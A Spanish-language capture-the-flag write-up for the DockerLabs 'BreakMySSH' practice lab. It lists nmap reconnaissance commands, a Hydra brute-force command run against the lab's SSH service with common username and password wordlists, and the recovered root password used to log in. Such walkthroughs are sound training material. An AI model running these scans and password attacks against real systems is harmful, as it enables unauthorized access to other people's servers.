# DockerLabs — BreakMySSH

![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-21262d?style=flat)
![Dificultad](https://img.shields.io/badge/Dificultad-Very%20Easy-238636?style=flat)
![SO](https://img.shields.io/badge/SO-Linux-21262d?style=flat&logo=linux&logoColor=FCC624)
![Estado](https://img.shields.io/badge/Estado-Completada-238636?style=flat)

---

## Resumen

Laboratorio para practicar ataques de fuerza bruta con Hydra contra el servicio SSH.

---

## Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p22 172.17.0.2
```

Vemos que solo tenemos un servicio corriendo, SSH, vemos que tiene una versión antigua que permite enumeración de usuarios que nos puede servir más adelante.

<img src="../images/Pasted%20image%2020260816233914.png" width="365" alt="Pasted image 20260816233914" />

---

## Enumeración

---
Decidí hacer un ataque de fuerza bruta con una lista de usuarios y con una lista de contraseñas, ya que por la dificultad de la máquina, pensé que había que hacerlo

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -f
``` 

Y nos la encontró, usuario root y contraseña estrella.

<img src="../images/Pasted%20image%2020260816234101.png" width="504" alt="Pasted image 20260816234101" />

## Acceso inicial (Foothold)

Simplemente entramos con las credenciales y ya somos root.

<img src="../images/Pasted%20image%2020260816234220.png" width="221" alt="Pasted image 20260816234220" />
